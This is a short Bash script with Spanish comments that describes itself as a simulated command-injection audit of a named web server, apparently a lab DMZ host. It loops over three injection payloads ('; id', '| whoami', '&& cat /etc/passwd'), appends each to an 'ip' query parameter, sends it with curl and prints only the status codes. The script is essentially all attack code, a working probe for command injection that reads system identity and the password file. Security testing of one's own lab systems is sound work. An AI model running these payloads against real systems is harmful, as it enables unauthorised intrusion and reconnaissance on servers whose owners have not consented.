#!/bin/bash
TARGET_URL="https://servidor-web-dmz-mariano-molina.onrender.com"

echo "[+] Iniciando simulacion de auditoria Command Injection contra: $TARGET_URL"
PAYLOADS=(
  "; id"
  "| whoami"
  "&& cat /etc/passwd"
)

for payload in "${PAYLOADS[@]}"; do
    echo "[*] Probando payload de comando: $payload"
    curl -s -o /dev/null -w "%{http_code}\n" -G --data-urlencode "ip=127.0.0.1$payload" "$TARGET_URL"
    sleep 1
done

echo "[+] Auditoria de Inyeccion de Comandos completada."
tail -f /dev/null
